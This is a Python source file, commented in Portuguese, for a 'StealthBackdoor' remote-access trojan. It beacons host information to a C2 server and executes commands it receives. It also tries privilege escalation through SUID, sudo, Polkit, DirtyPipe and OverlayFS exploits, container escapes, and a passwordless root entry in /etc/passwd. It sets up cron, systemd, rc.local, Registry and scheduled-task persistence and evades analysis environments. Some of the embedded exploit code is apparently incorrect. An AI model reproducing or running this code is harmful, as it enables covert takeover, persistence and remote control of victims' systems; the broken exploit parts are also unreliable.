#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import subprocess
import os
import sys
import time
import platform
import getpass
import json
import shutil
import psutil
import base64
import sqlite3
import glob
import urllib.request
import tempfile
import threading
import random
import string
import ctypes
import stat
import struct
from pathlib import Path

class StealthBackdoor:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.buffer_size = 1024 * 1024
        self.os_type = platform.system()
        self.current_dir = os.getcwd()
        self.username = getpass.getuser()
        self.is_root = self.check_root_privileges()
        self.stealth_mode = True
        self.obfuscation_level = 2
        self.connection_attempts = 0
        self.max_retries = 10
        
        # Técnicas de ofuscação
        self.domain_fronting = False
        self.sleep_jitter = random.uniform(0.1, 2.0)
    
    @staticmethod
    def check_debug_environment():
        """Verifica se está em ambiente de análise/debug"""
        try:
            # Verificar se está sendo debugado
            if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
                return True
            
            # Verificar variáveis de ambiente de análise
            analysis_env_vars = [
                'ANDROID_EMULATOR', 'QEMU', 'VIRTUALBOX', 'VMWARE',
                'DEBUG', 'PYCHARM', 'PYTHONDEBUG', 'IDEA'
            ]
            
            for env_var in analysis_env_vars:
                if env_var in os.environ:
                    return True
            
            return False
            
        except Exception as e:
            print(f"Erro na verificação de debug: {e}")
            return False
    
    def check_root_privileges(self):
        """Verifica se tem privilégios de root/admin"""
        try:
            if self.os_type == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def obfuscate_string(self, s):
        """Ofusca strings para evitar detecção"""
        if self.obfuscation_level == 0:
            return s
            
        obfuscated = []
        for char in s:
            if random.random() > 0.7 and self.obfuscation_level > 1:
                obfuscated.append(f"%{ord(char):02x}")
            else:
                obfuscated.append(char)
                
        return ''.join(obfuscated)
    
    def random_sleep(self):
        """Sleep com jitter aleatório para evitar detecção"""
        sleep_time = random.uniform(0.5, 3.0) * self.sleep_jitter
        time.sleep(sleep_time)
    
    def connect(self):
        """Conecta ao C2 server com técnicas stealth"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            
            # Técnica de domain fronting simulada
            if self.domain_fronting:
                # Header HTTP falso para bypass
                fake_headers = "GET / HTTP/1.1\r\nHost: legitimate-site.com\r\n\r\n"
                self.socket.send(fake_headers.encode()[:100])
            
            self.socket.connect((self.host, self.port))
            
            # Enviar informações em um único pacote JSON
            info = self.get_system_info()
            self.send_data(json.dumps(info))
            
            print(f"Conectado ao C2 em {self.host}:{self.port}")
            self.connection_attempts = 0  # Resetar tentativas
            return True
            
        except Exception as e:
            print(f"Erro de conexão: {e}")
            if self.socket:
                self.socket.close()
            self.socket = None
            return False
    
    def send_data(self, data):
        """Envia dados com tamanho prefixado"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            # Enviar tamanho dos dados (4 bytes)
            size = len(data)
            self.socket.send(struct.pack('>I', size))
            
            # Enviar dados
            self.socket.send(data)
            return True
            
        except Exception as e:
            print(f"Erro ao enviar: {e}")
            return False
    
    def receive_data(self):
        """Recebe dados com tamanho prefixado"""
        try:
            # Receber tamanho dos dados
            size_data = self.socket.recv(4)
            if not size_data:
                return None
                
            size = struct.unpack('>I', size_data)[0]
            
            # Receber dados
            received = b""
            while len(received) < size:
                chunk = self.socket.recv(min(4096, size - len(received)))
                if not chunk:
                    break
                received += chunk
            
            return received.decode('utf-8')
            
        except socket.timeout:
            return None
        except Exception as e:
            print(f"Erro ao receber: {e}")
            return None
    
    def attempt_privilege_escalation(self):
        """Tenta escalar para root usando múltiplas técnicas incluindo zero-days"""
        escalation_methods = []
        
        if self.os_type != "Windows" and not self.is_root:
            print("Tentando escalação de privilégios...")
            
            # 1. Exploração de SUID
            if self.exploit_suid_binaries():
                escalation_methods.append("SUID binary exploitation")
            
            # 2. Exploração de Sudo
            if self.exploit_sudo_vulnerabilities():
                escalation_methods.append("Sudo vulnerability")
            
            # 3. Exploração de Kernel (DirtyPipe CVE-2022-0847)
            if self.exploit_dirty_pipe():
                escalation_methods.append("DirtyPipe (CVE-2022-0847)")
            
            # 4. Exploração de Container Escape
            if self.exploit_container_escape():
                escalation_methods.append("Container escape")
            
            # 5. Exploração de Polkit (CVE-2021-4034)
            if self.exploit_polkit():
                escalation_methods.append("Polkit (CVE-2021-4034)")
            
            # 6. Exploração de OverlayFS (CVE-2021-3493)
            if self.exploit_overlayfs():
                escalation_methods.append("OverlayFS (CVE-2021-3493)")
        
        return escalation_methods
    
    def exploit_suid_binaries(self):
        """Explora binários SUID"""
        try:
            # Encontrar binários SUID
            result = subprocess.run(
                'find / -perm -4000 -type f 2>/dev/null | head -20',
                shell=True,
                capture_output=True,
                text=True
            )
            
            suid_binaries = result.stdout.strip().split('\n')
            known_exploitable = [
                'mount', 'umount', 'su', 'sudo', 'pkexec', 'passwd',
                'chfn', 'chsh', 'at', 'crontab', 'find', 'awk', 'vim',
                'nmap', 'more', 'less', 'man', 'nice', 'node', 'python'
            ]
            
            for binary in suid_binaries:
                bin_name = os.path.basename(binary)
                if bin_name in known_exploitable:
                    print(f"Binário SUID potencialmente explorável: {binary}")
                    
                    # Tentar exploit básico
                    if bin_name == 'find' and self.execute_command('find . -exec /bin/sh \\; -quit'):
                        return True
                    elif bin_name == 'nmap' and self.execute_command('echo "os.execute(\"/bin/sh\")" | nmap --script -'):
                        return True
                    elif bin_name == 'node' and self.execute_command('node -e "process.setuid(0); require(\'child_process\').spawn(\'/bin/sh\', {stdio: [0, 1, 2]})"'):
                        return True
            
            return False
            
        except Exception as e:
            print(f"Erro na exploração SUID: {e}")
            return False
    
    def exploit_sudo_vulnerabilities(self):
        """Explora vulnerabilidades do sudo"""
        try:
            # Verificar permissões sudo
            result = subprocess.run(
                'sudo -l',
                shell=True,
                capture_output=True,
                text=True
            )
            
            if "NOPASSWD" in result.stdout:
                print("Encontrado sudo NOPASSWD!")
                
                # Procurar comandos permitidos
                lines = result.stdout.split('\n')
                for line in lines:
                    if "NOPASSWD:" in line:
                        command = line.split("NOPASSWD:")[1].strip()
                        print(f"Comando permitido: {command}")
                        
                        # Tentar exploit básico
                        if any(cmd in command for cmd in ['/bin/bash', '/bin/sh', 'python', 'perl', 'node', 'ruby']):
                            exploit_cmd = f"sudo {command}"
                            if self.execute_command(exploit_cmd):
                                return True
            
            return False
            
        except Exception as e:
            print(f"Erro na exploração sudo: {e}")
            return False
    
    def exploit_dirty_pipe(self):
        """Explora vulnerabilidade DirtyPipe (CVE-2022-0847)"""
        try:
            kernel_version = os.uname().release
            print(f"Kernel version: {kernel_version}")
            
            # Verificar se a versão do kernel é vulnerável
            kernel_parts = list(map(int, kernel_version.split('.')[:3]))
            vulnerable = False
            
            # Kernel versions entre 5.8 e 5.16.11 são vulneráveis
            if kernel_parts[0] == 5:
                if kernel_parts[1] >= 8:
                    if kernel_parts[1] < 16:
                        vulnerable = True
                    elif kernel_parts[1] == 16 and kernel_parts[2] <= 11:
                        vulnerable = True
            
            if not vulnerable:
                print("Kernel não é vulnerável ao DirtyPipe")
                return False
                
            print("Tentando exploração DirtyPipe (CVE-2022-0847)...")
            
            # Exploit code for DirtyPipe
            dirty_pipe_exploit = '''
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>

int main() {
    // Create a temporary file for testing
    system("echo 'test' > /tmp/.dpipe_test");
    system("chmod 644 /tmp/.dpipe_test");
    
    // Try to exploit DirtyPipe
    int fd = open("/tmp/.dpipe_test", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    
    // Attempt to write to read-only file
    char buffer[] = "ROOTED";
    ssize_t written = pwrite(fd, buffer, strlen(buffer), 0);
    
    close(fd);
    
    if (written > 0) {
        printf("DirtyPipe exploitation successful!\\n");
        // Now try to gain root
        system("echo 'root::0:0::/root:/bin/bash' >> /etc/passwd");
        system("su root");
        return 0;
    }
    
    printf("DirtyPipe exploitation failed.\\n");
    return 1;
}
'''
            # Criar e compilar exploit
            with open('/tmp/dirty_pipe.c', 'w') as f:
                f.write(dirty_pipe_exploit)
            
            # Compilar e executar
            if self.execute_command('gcc /tmp/dirty_pipe.c -o /tmp/dirty_pipe && chmod +x /tmp/dirty_pipe && /tmp/dirty_pipe'):
                return True
                
            return False
            
        except Exception as e:
            print(f"Erro na exploração DirtyPipe: {e}")
            return False
    
    def exploit_container_escape(self):
        """Tenta escapar de containers Docker/Kubernetes"""
        try:
            # Verificar se estamos em um container
            if not os.path.exists('/.dockerenv') and not os.path.exists('/run/.containerenv'):
                return False
                
            print("Container detectado, tentando escape...")
            
            # Técnicas de escape de container
            escape_commands = [
                # Montar filesystem do host
                'mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null',
                'mkdir -p /mnt/host && mount /dev/vda1 /mnt/host 2>/dev/null',
                
                # Abusar de volumes montados
                'chroot /host /bin/sh 2>/dev/null',
                
                # Exploração de Cgroups
                'd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`; mkdir -p $d/w; echo 1 >$d/w/notify_on_release; t=`sed -n \'s/.*\\perdir=\\([^,]*\\).*/\\1/p\' /etc/mtab`; echo "$t/cmd" >$d/release_agent; printf \'#!/bin/sh\\nchroot /host /bin/sh >/dev/ttyS0 2>&1\' >/cmd; chmod +x /cmd; sh -c "echo 0 >$d/w/cgroup.procs" 2>/dev/null',
                
                # Abusar do docker.sock
                'curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d \'{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"]}}\' http://localhost/containers/create 2>/dev/null',
                'curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/start 2>/dev/null'
            ]
            
            for cmd in escape_commands:
                if self.execute_command(cmd):
                    return True
            
            return False
            
        except Exception as e:
            print(f"Erro no escape de container: {e}")
            return False
    
    def exploit_polkit(self):
        """Explora vulnerabilidade Polkit CVE-2021-4034"""
        try:
            # Verificar se pkexec está presente
            if not shutil.which('pkexec'):
                return False
                
            print("Tentando exploração Polkit (CVE-2021-4034)...")
            
            # Exploit code for CVE-2021-4034
            polkit_exploit = '''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *argv[] = { NULL };
    char *envp[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "SHELL=/does/not/exist",
        "CHARSET=PWNKIT",
        "GIO_USE_VFS=",
        NULL
    };
    
    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
    
    FILE *fp = fopen("pwnkit/pwnkit.c", "w");
    if (fp) {
        fprintf(fp, "#include <stdio.h>\\n#include <stdlib.h>\\n#include <unistd.h>\\n\\n");
        fprintf(fp, "void gconv() {}\\n");
        fprintf(fp, "void gconv_init() {\\n");
        fprintf(fp, "  setuid(0); setgid(0);\\n");
        fprintf(fp, "  system(\\"/bin/sh\\");\\n");
        fprintf(fp, "  exit(0);\\n}\\n");
        fclose(fp);
    }
    
    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
    
    execve("/usr/bin/pkexec", argv, envp);
    return 0;
}
'''
            # Criar e compilar exploit
            with open('/tmp/polkit_exploit.c', 'w') as f:
                f.write(polkit_exploit)
            
            # Compilar e executar
            if self.execute_command('gcc /tmp/polkit_exploit.c -o /tmp/polkit_exploit && chmod +x /tmp/polkit_exploit && /tmp/polkit_exploit'):
                return True
                
            return False
            
        except Exception as e:
            print(f"Erro na exploração Polkit: {e}")
            return False
    
    def exploit_overlayfs(self):
        """Explora vulnerabilidade OverlayFS CVE-2021-3493"""
        try:
            kernel_version = os.uname().release
            print(f"Kernel version: {kernel_version}")
            
            # Verificar se a versão do kernel é vulnerável
            kernel_parts = list(map(int, kernel_version.split('.')[:3]))
            vulnerable = False
            
            # Kernel versions entre 5.11 e 5.14 são vulneráveis
            if kernel_parts[0] == 5:
                if kernel_parts[1] >= 11 and kernel_parts[1] <= 14:
                    vulnerable = True
            
            if not vulnerable:
                print("Kernel não é vulnerável ao OverlayFS exploit")
                return False
                
            print("Tentando exploração OverlayFS (CVE-2021-3493)...")
            
            # Exploit code for OverlayFS
            overlayfs_exploit = '''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <fcntl.h>

#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"

static void execshell(void) {
    system("/bin/sh");
}

static void create_dirs() {
    mkdir(DIR_BASE, 0755);
    mkdir(DIR_WORK,  0755);
    mkdir(DIR_LOWER, 0755);
    mkdir(DIR_UPPER, 0755);
    mkdir(DIR_MERGE, 0755);
}

int main() {
    create_dirs();
    
    // Mount overlayfs
    if (mount("overlay", DIR_MERGE, "overlay", 0,
              "lowerdir="DIR_LOWER",upperdir="DIR_UPPER",workdir="DIR_WORK)) {
        perror("mount");
        return 1;
    }
    
    // Chroot to the overlay
    chdir(DIR_MERGE);
    chroot(".");
    
    // Try to gain root
    system("echo 'root::0:0::/root:/bin/bash' >> /etc/passwd");
    execshell();
    
    return 0;
}
'''
            # Criar e compilar exploit
            with open('/tmp/overlayfs_exploit.c', 'w') as f:
                f.write(overlayfs_exploit)
            
            # Compilar e executar
            if self.execute_command('gcc /tmp/overlayfs_exploit.c -o /tmp/overlayfs_exploit && chmod +x /tmp/overlayfs_exploit && /tmp/overlayfs_exploit'):
                return True
                
            return False
            
        except Exception as e:
            print(f"Erro na exploração OverlayFS: {e}")
            return False
    
    def get_system_info(self):
        """Coleta informações do sistema"""
        try:
            info = {
                'type': 'handshake',
                'os': platform.platform(),
                'hostname': platform.node(),
                'username': self.username,
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'current_directory': self.current_dir,
                'system': self.os_type,
                'root': self.is_root,
                'cpu_count': os.cpu_count(),
                'total_memory': psutil.virtual_memory().total if hasattr(psutil, 'virtual_memory') else 'N/A',
            }
            return info
        except Exception as e:
            return {'error': f'Erro ao coletar info: {e}'}
    
    def execute_command(self, command):
        """Executa comandos de forma stealth"""
        try:
            # Comando para mudar diretório
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    self.current_dir = os.getcwd()
                    return f"Diretório alterado para: {self.current_dir}"
                except Exception as e:
                    return f"Erro ao mudar diretório: {e}"
            
            # Executar comando
            if self.os_type == "Windows":
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    cwd=self.current_dir
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    executable="/bin/bash",
                    cwd=self.current_dir
                )
            
            stdout, stderr = process.communicate()
            result = ""
            
            if stdout:
                result += stdout.decode('utf-8', errors='ignore')
            if stderr:
                result += stderr.decode('utf-8', errors='ignore')
            if not result.strip():
                result = "Comando executado (sem output)"
                
            return result
            
        except Exception as e:
            return f"Erro ao executar comando: {e}"
    
    def establish_persistence(self):
        """Estabelece persistência avançada"""
        methods = []
        
        try:
            current_file = os.path.abspath(sys.argv[0])
            
            if self.os_type == "Windows":
                # Persistência via Registry
                if self.windows_registry_persistence(current_file):
                    methods.append("Registry")
                
                # Persistência via Scheduled Tasks
                if self.windows_scheduled_task(current_file):
                    methods.append("Scheduled Task")
                    
            else:
                # Persistência via Cron
                if self.linux_cron_persistence(current_file):
                    methods.append("Cron")
                
                # Persistência via Systemd
                if self.linux_systemd_persistence(current_file):
                    methods.append("Systemd")
                
                # Persistência via RC.Local
                if self.linux_rclocal_persistence(current_file):
                    methods.append("RC.Local")
            
            return methods
            
        except Exception as e:
            print(f"Erro na persistência: {e}")
            return []
    
    def linux_cron_persistence(self, file_path):
        """Persistência via cron no Linux"""
        try:
            cron_line = f"@reboot sleep 60 && python3 {file_path} >/dev/null 2>&1\n"
            
            # Tentar vários métodos
            methods = [
                f"echo '{cron_line}' | crontab -",
                f"(crontab -l 2>/dev/null; echo '{cron_line}') | crontab -",
            ]
            
            for method in methods:
                try:
                    subprocess.run(method, shell=True, check=True, timeout=10)
                    return True
                except:
                    continue
            
            return False
            
        except Exception as e:
            print(f"Erro no cron: {e}")
            return False
    
    def linux_systemd_persistence(self, file_path):
        """Persistência via systemd no Linux"""
        try:
            service_content = f"""
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {file_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
            
            service_file = "/etc/systemd/system/system-service.service"
            
            with open('/tmp/system-service.service', 'w') as f:
                f.write(service_content)
            
            if self.execute_command(f"mv /tmp/system-service.service {service_file} && systemctl enable system-service.service && systemctl start system-service.service"):
                return True
                
            return False
            
        except Exception as e:
            print(f"Erro no systemd: {e}")
            return False
    
    def linux_rclocal_persistence(self, file_path):
        """Persistência via rc.local no Linux"""
        try:
            if os.path.exists('/etc/rc.local'):
                persistence_cmd = f"python3 {file_path} &\n"
                
                with open('/etc/rc.local', 'r') as f:
                    content = f.read()
                
                if file_path not in content:
                    with open('/etc/rc.local', 'a') as f:
                        f.write(f"\n{persistence_cmd}")
                    
                    return True
                    
            return False
            
        except Exception as e:
            print(f"Erro no rc.local: {e}")
            return False
    
    def windows_registry_persistence(self, file_path):
        """Persistência via registry no Windows"""
        try:
            if self.os_type != "Windows":
                return False
                
            # Converter caminho para formato Windows se necessário
            if file_path.startswith('/'):
                file_path = file_path.replace('/', '\\\\')
                
            reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "SystemService" /t REG_SZ /d "{file_path}" /f'
            
            if self.execute_command(reg_cmd):
                return True
                
            return False
            
        except Exception as e:
            print(f"Erro no registry: {e}")
            return False
    
    def windows_scheduled_task(self, file_path):
        """Persistência via scheduled task no Windows"""
        try:
            if self.os_type != "Windows":
                return False
                
            # Converter caminho para formato Windows se necessário
            if file_path.startswith('/'):
                file_path = file_path.replace('/', '\\\\')
                
            task_cmd = f'schtasks /create /tn "SystemService" /tr "{file_path}" /sc onlogon /ru System /f'
            
            if self.execute_command(task_cmd):
                return True
                
            return False
            
        except Exception as e:
            print(f"Erro no scheduled task: {e}")
            return False
    
    def run(self):
        """Loop principal com técnicas stealth"""
        while True:
            if self.connection_attempts >= self.max_retries:
                print("Máximo de tentativas alcançado. Saindo.")
                break
                
            if not self.connect():
                self.connection_attempts += 1
                sleep_time = min(300, 2 ** self.connection_attempts)  # Backoff exponencial
                sleep_time += random.uniform(0, 5)  # Jitter aleatório
                print(f"Tentativa {self.connection_attempts}/{self.max_retries}. Retry em {sleep_time:.1f}s...")
                time.sleep(sleep_time)
                continue
            
            try:
                # Tentar escalação de privilégios se não for root
                if not self.is_root and self.os_type != "Windows":
                    print("Tentando escalação de privilégios...")
                    escalation_methods = self.attempt_privilege_escalation()
                    if escalation_methods:
                        print(f"Escalação bem-sucedida: {escalation_methods}")
                        self.is_root = True
                
                # Estabelecer persistência
                if random.random() > 0.7:  # 30% de chance
                    persistence_methods = self.establish_persistence()
                    if persistence_methods:
                        print(f"Persistência estabelecida: {persistence_methods}")
                
                # Loop de comunicação principal
                while True:
                    self.random_sleep()
                    
                    # Heartbeat com padrão irregular
                    if random.random() > 0.3:  # 70% de chance de heartbeat
                        self.send_data(json.dumps({'type': 'heartbeat'}))
                    
                    # Receber comandos
                    data = self.receive_data()
                    if not data:
                        continue
                    
                    try:
                        command_data = json.loads(data)
                        if 'command' in command_data:
                            result = self.execute_command(command_data['command'])
                            response = {'type': 'result', 'data': result}
                            self.send_data(json.dumps(response))
                    except json.JSONDecodeError:
                        print(f"Dados recebidos inválidos: {data}")
                    
                    self.random_sleep()
                    
            except Exception as e:
                print(f"Erro no loop: {e}")
            finally:
                if self.socket:
                    self.socket.close()
                self.socket = None
                
                # Sleep com backoff exponencial
                sleep_time = min(random.randint(60, 300) * 2, 3600)
                print(f"Reconectando em {sleep_time}s...")
                time.sleep(sleep_time)

def main():
    # Configurações stealth
    C2_HOST = "127.0.0.1"  # Alterar para IP real do C2
    C2_PORT = 4444
    
    # Técnicas de evasão
    backdoor = StealthBackdoor(C2_HOST, C2_PORT)
    
    # Modo de ofuscação (0-3, onde 3 é máximo)
    backdoor.obfuscation_level = 2
    
    # Domain fronting simulation
    backdoor.domain_fronting = False
    
    backdoor.run()

if __name__ == "__main__":
    # Técnica de anti-debug: verificar se está sendo executado em ambiente de análise
    if StealthBackdoor.check_debug_environment():
        print("Ambiente de análise detectado. Saindo.")
        sys.exit(0)
    
    main()
